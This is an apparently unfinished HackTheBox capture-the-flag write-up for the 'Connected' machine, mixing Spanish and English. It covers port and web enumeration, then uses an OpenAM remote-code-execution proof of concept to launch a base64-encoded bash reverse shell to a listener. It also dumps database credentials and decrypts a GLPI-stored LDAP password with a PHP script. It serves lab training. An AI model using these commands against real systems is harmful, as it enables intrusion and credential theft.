# **Connected**

![Dificultad](https://img.shields.io/badge/Dificultad-Easy-green)
![SO](https://img.shields.io/badge/SO-Linux-yellow)
![Plataforma](https://img.shields.io/badge/Plataforma-HackTheBox-9FEF00)

---

&nbsp;

## Resume

Breve resumen de 2-3 líneas: cómo se obtuvo el foothold, qué vulnerabilidad(es) clave se explotaron, y cómo se escaló a root/administrador.

---

&nbsp;

## Enumeration

###  <u>Nmap</u>

- **First Nmap**: General assesment

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [IP]
```

- **Result:** Service Specifications
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-28 22:37 CEST
Initiating SYN Stealth Scan at 22:37
Scanning 10.129.111.232 [65535 ports]
Discovered open port 22/tcp on 10.129.111.232
Discovered open port 443/tcp on 10.129.111.232
Discovered open port 80/tcp on 10.129.111.232
Completed SYN Stealth Scan at 22:37, 26.34s elapsed (65535 total ports)
Nmap scan report for 10.129.111.232
Host is up, received user-set (0.059s latency).
Scanned at 2026-09-28 22:37:13 CEST for 26s
Not shown: 65436 filtered tcp ports (no-response), 96 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
           Raw packets sent: 130991 (5.764MB) | Rcvd: 99 (3.972KB)

```

- **Second Nmap**

```bash
nmap  -sCV -p22,80,443 [IP]
```

- **Result:**

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-28 22:38 CEST
Nmap scan report for 10.129.111.232
Host is up (0.085s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.111.232/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://management.htb/
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.56 seconds
```

### Services Resume

- Port 22/tcp — SSH: Protocol to maintain a connexion between two devices
- Port 80/tcp — HTTP: Web aplication/page
- Port 443/tcp  HTTPS: Web aplication with TLS/SSL encription for security, which redirects to https://management.htb/

### /etc/hosts

To access the webpage we add at the end of the `/etc/hosts` file the redirection to the mentioned page:

```
echo "[ip] management.htb" | sudo tee -a /etc/hosts
```


###  <u>Web Aplication Fingerprinting</u>
- Use whatweb to see the specifications about the web app and the technologies used

```bash
whatweb https://management.htb
```
- **Output**

```bash
https://management.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.111.232], Script, Title[Management — Managed IT &amp; Infrastructure], nginx[1.24.0]
```

###  <u>Directory Enumeration</u>

- Using *gobuster*

```
gobuster dir -u https://management.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 20 -x php,txt,html,php.bak -k --exclude-length 2360
```
Last two are really important as two message errors will apeare if done normally. This flags do:

`-k`: Avoid certificate check  
`--exclude-length`: to avoid responses with specific sizes

**Output**

```
/assets
```

###  <u>Subdomain Enumeration</u>

Inside the website I noticed there is another subdomain shown on "Client Login": `sso.management.htb`

Trying to enumerate, I found none other.
---

# Foothold

On the main website, we'll two interesting things:

1. A script inside the html wich gets a file from the enumerated directory `/assets/app.enc`, then decodes with a key specified on said script.

2. The previously mentioned subdomain:

Accesing to this subdomain will show a login page. This page is running with `OpenAM`, which version can be seen on an atribut inside the html using `Ctrl + u`.

With a quick search we'll find a related vulnerability on `OpenAM 16.0.5v`

###  <u>CVE-2026-33439</u>

https://github.com/infernosalex/CVE-2026-33439-Python-PoC

- Explain the exploit

```bash
python3 exploit.py \
  --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'id' 
```

**Output**

```
[+] HTTP 200 
uid=996(openam) gid=987(openam) groups=987(openam)
```

This confirms that the exploit works.

- Revershell

1. 
```bash
#To avoid problems with special characters, use base64
echo "setsid bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1' </dev/null >/dev/null 2>&1 & " | base64 -w 0
```
2. 
```bash
#Start listener on different terminal
nc -lnvp 4444
```
3. 
```bash
#Send the payload with the script
python3 exploit.py \
  --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  'echo "<base64-code>" | base64 -d | bash'
```
4. 
```
listening on [any] 4444 ...
connect to [...] from (UNKNOWN) [10.129.111.232] 54146
bash: cannot set terminal process group (2437): Inappropriate ioctl for device
bash: no job control in this shell
openam@management:/$ 
```


- TTY treatment

```bash
script /dev/null -c bash
# Ctrl + z 
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows X columns Y #Change X,Y values for your terminals size
```


---

## User Flag(Latteral movement)

- Opening the `/etc/passwd` file

```bash
cat /etc/passwd
```
I found that there is another user called `owen`.

- After the usuar PE enumeration:

```bash
ss -tulnp
```
I found a loopback service on the default port for SQL databases: `127.0.0.1:3306`.

Looking for some running processes, I saw one running mariaDB, therfore I asumed that mariaDB is running on port 3306.

- Using linpeas find creds for the DB on `config_db.php`:

```bash
/opt/glpi/config/config_db.php:   public $dbpassword = '8rhu0L6Pw4Y7';                                                                                                                                                                      
/opt/glpi/config/config_db.php:   public $dbuser = 'glpi';
/opt/glpi/install/migrations/update_10.0.x_to_11.0.0/configs.php:    'password_init_token_delay'     => '86400',
```

- Connect to DB

```bash

mysql -h localhost -u 'glpi' -p '8rhu0L6Pw4Y7' -e "SHOW DATABASES;"
```

- Enumeration process:

```bash
SHOW DATABASES;
USE glpidb;
SHOW TABLES;
SELECT * FROM glpi_authldaps;
```
The other fileds only contain 'null' values.

- Here we'll find a hash
```
avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```
In reallity, this is not a hash but a ciphered line, so no tool will tell you what it trully means.

- Search for the key to decipher.
```bash
grep -r "GLPIKEY" /opt/glpi/ 2>/dev/null
```
It will return a key found on `/opt/glpi/src/autoload/constants.php`.

```
define("GLPIKEY", "GLPI£i'snarss'ç")
```
### GLPIkey

- When going to the file `GLPIkey.php`, we find some methods which treat the process of legacy key, encryption & decryption.

There we see that there are two methods, decrypt() and decryptUsingLegacyKey(). Inside this methods ' libsodium XChaCha20-Poly1305' is mentioned, which is an ecrypting method.

- At line 103 we see another interesting file `$this->keyfile = $config_dir . '/glpicrypt.key';`. Using `find` the absolute path is `/opt/glpi/config/glpicrypt.key`

```bash
wc -c /opt/glpi/config/glpicrypt.key
```

- The file is as big as the define length on the previous .php functions, therefore it should be the key. Lets make a scritp for decryption:

1. Create tmp directory
```bash
cd "$(mktemp -d)"
```

2. Make the script

```bash
#decrypt.php                                               
<?php
define("GLPI_CONFIG_DIR", "/opt/glpi/config");
require "/opt/glpi/vendor/autoload.php";
require "/opt/glpi/src/GLPIKey.php";

$key = new GLPIKey();
$dec     = "avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==";
$pass    = $key->decrypt($dec);

echo "\n";
echo "[+] Decrypted pass: $pass\n";
```

3. Give exec perms and use
```bash
chmod +x decrypt.php
php decrypt.php
```

- The result is :
```
openam@management:/tmp/tmp.WghDYlDbtT$ php key_get.php                                               
#decrypt.php

[+] Decrypted pass: WpczC40GhTbk

```


----On going------





--- 

# Learned

Don't skip something on linpeas only because its not 'orange'(95% of being a vector for PE). 

In this case there were credentials on a file that wasn't marked as orange, because linpeas doesn't take lateral movement as PE.